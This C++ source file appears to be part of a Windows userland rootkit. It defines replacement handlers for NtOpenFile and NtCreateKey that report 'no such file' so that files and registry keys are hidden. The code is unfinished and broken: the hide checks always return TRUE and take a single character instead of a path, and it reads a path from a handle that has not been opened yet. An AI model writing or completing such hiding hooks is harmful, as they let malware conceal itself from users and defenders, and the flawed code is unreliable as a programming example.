#include "stdafx.h"
#include "ZwOpenFile.h"
#include <windows.h>

#include <iostream>
#include <Windows.h>

typedef long NTSTATUS;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(__stdcall *pNtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);

typedef NTSTATUS(*pNtCreateKey)(__out PHANDLE KeyHandle,
	__in ACCESS_MASK DesiredAccess,
	__in POBJECT_ATTRIBUTES ObjectAttributes,
	__reserved ULONG TitleIndex,
	__in_opt PUNICODE_STRING Class,
	__in ULONG CreateOptions,
	__out_opt PULONG Disposition);


typedef NTSTATUS(__stdcall *_NtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
    );

typedef VOID(__stdcall *_RtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

#define FILE_CREATE 0x00000002
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define OBJ_CASE_INSENSITIVE 0x00000040L

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }


BOOL mustHideFile(TCHAR filePath) {
	return TRUE; // TODO check la fin de la string avec des constantes
}

BOOL mustHideReg(TCHAR filePath) {
	return TRUE; // TODO check la fin de la string avec des constantes
}


NTSTATUS NTAPI NewNtOpenFile(
	PHANDLE				phFile,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	PIO_STATUS_BLOCK	IoStatusBlock,
	ULONG				ShareAccess,
	ULONG				OpenOptions)
{
	TCHAR sPath[MAX_PATH];
	DWORD dwRet;
	
	dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
	pNtOpenFile NtOpenFile = (pNtOpenFile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenFile");
	if (!mustHideFile(*sPath))
		return NtOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
	return 0xC000000F; // STATUS_NO_SUCH_FILE
}

/* use with 

_NtCreateFile NtCreateFile = (_NtCreateFile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateFile");
_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");

see http://www.sysnative.com/forums/programming/8592-ntcreatefile-example.html */

NTSTATUS NTAPI NewNtCreateKey(
	PHANDLE				KeyHandle,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	ULONG				TitleIndex,
	PUNICODE_STRING		Class,
	ULONG				CreateOptions,
	PULONG				Disposition)
{
	TCHAR sPath[MAX_PATH];
	DWORD dwRet;
	
	dwRet = GetFinalPathNameByHandle(*KeyHandle, sPath, MAX_PATH, VOLUME_NAME_NONE);

	pNtCreateKey NtCreateKey = (pNtCreateKey) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateKey");
	if (!mustHideReg(*sPath))
		return NtCreateKey(KeyHandle, DesiredAccess, ObjectAttributes, TitleIndex, Class, CreateOptions, Disposition);
	return 0xC000000F; // STATUS_NO_SUCH_FILE
}
